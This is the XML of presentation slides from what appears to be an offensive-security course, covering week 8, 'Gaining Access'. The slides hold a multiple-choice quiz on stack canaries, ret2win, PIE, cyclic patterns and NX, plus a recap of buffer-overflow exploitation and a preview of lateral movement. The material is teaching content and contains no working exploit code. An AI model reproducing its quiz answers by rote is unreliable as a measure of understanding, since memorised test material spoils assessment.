          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="185623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Q1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="214884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What does a stack canary protect against?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="283464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SQL injection</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A stack overflow overwriting the return address undetected — a corrupted canary aborts the program before it returns</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Network sniffing</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Password reuse</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="1691640"/>
            <a:ext cx="5257800" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2609"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="185623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Q2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="214884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Why does ret2win need PIE disabled to work reliably?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="283464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It doesn't matter</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With PIE on, the binary loads at a randomized address each run, making a hardcoded address unreliable</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PIE only affects libraries</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PIE prevents the overflow entirely</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4023360"/>
            <a:ext cx="5257800" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2609"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="418795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Q3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="448056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What does a cyclic pattern let you determine?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="516636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The target's IP address</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The exact byte offset where your input starts overwriting a specific value</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The password</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The compiler version</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="4023360"/>
            <a:ext cx="5257800" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2609"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="418795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Q4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="448056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Why does ret2win still work even with NX enabled?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="516636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NX doesn't exist</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ret2win jumps to code already in the binary rather than executing injected shellcode</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NX only blocks network traffic</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It doesn't — NX always blocks ret2win</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="110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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 1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WEEK 8 SUMMARY — PHASE 3 COMPLETE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="841248"/>
            <a:ext cx="10058400" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What You Now Know — and What's Next</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1828800"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>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234440" y="178308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Recap: An overflow hijacks an existing jump</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="211226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No new capability is created — a return the program was already going to make just gets redirected.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2697480"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>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234440" y="265176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Recap: Measure, don't guess</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="298094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checksec and cyclic patterns turn exploit development into a precise, repeatable process.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3566160"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>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03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="352044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Recap: Phase 3 is complete</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="384962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Passwords, web application flaws, and now memory corruption — three genuinely different ways to gain access.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4434840"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>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04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="438912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Next week: Lateral Movement &amp; Pivoting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="471830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Phase 4 begins — having gotten in somewhere, we now use that foothold to reach what was previously unreachable.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="Image 0" descr="preencoded.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1">
            <a:alphaModFix amt="20000"/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10454335" y="5303520"/>
            <a:ext cx="1188720" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 1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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 1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2026-08-19T10:57:50Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-19T10:57:50Z</dcterms:modified>
</cp:coreProperties>
</file>